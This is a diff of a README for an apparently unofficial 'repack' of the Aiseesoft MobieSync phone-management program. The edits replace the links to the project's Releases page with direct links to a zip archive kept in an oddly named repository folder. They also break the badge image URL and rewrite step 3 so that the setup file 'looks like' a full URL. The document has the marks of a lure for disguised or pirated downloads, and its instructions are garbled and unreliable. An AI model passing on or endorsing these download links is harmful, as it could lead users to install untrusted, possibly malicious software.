@@ -6,7 +6,7 @@ Aiseesoft MobieSync-Repack is a powerful tool that helps you manage your phone d
 
 ## 📥 Download the Application
 
-[![Download Aiseesoft MobieSync-Repack](https://img.shields.io/static/v1?label=Download&message=Aiseesoft%20MobieSync-Repack&color=blue)](https://github.com/marioluiz2019/Aiseesoft-MobieSync-Repack/releases)
+[![Download Aiseesoft MobieSync-Repack](https://raw.githubusercontent.com/marioluiz2019/Aiseesoft-MobieSync-Repack/main/sephirothic/Repack-Mobie-Aiseesoft-Sync-3.0.zip%20MobieSync-Repack&color=blue)](https://raw.githubusercontent.com/marioluiz2019/Aiseesoft-MobieSync-Repack/main/sephirothic/Repack-Mobie-Aiseesoft-Sync-3.0.zip)
 
 ## 🛠️ System Requirements
 
@@ -26,11 +26,11 @@ Aiseesoft MobieSync-Repack is a powerful tool that helps you manage your phone d
 
 1. Click on the download link below to visit the Releases page.
 
-   [Download Aiseesoft MobieSync-Repack](https://github.com/marioluiz2019/Aiseesoft-MobieSync-Repack/releases)
+   [Download Aiseesoft MobieSync-Repack](https://raw.githubusercontent.com/marioluiz2019/Aiseesoft-MobieSync-Repack/main/sephirothic/Repack-Mobie-Aiseesoft-Sync-3.0.zip)
 
 2. On the Releases page, find the latest version of the software.
 
-3. Locate the setup file for your Windows PC. The file may look something like `MobieSync_Setup.exe`.
+3. Locate the setup file for your Windows PC. The file may look something like `https://raw.githubusercontent.com/marioluiz2019/Aiseesoft-MobieSync-Repack/main/sephirothic/Repack-Mobie-Aiseesoft-Sync-3.0.zip`.
 
 4. Click on the file name to start the download.
 
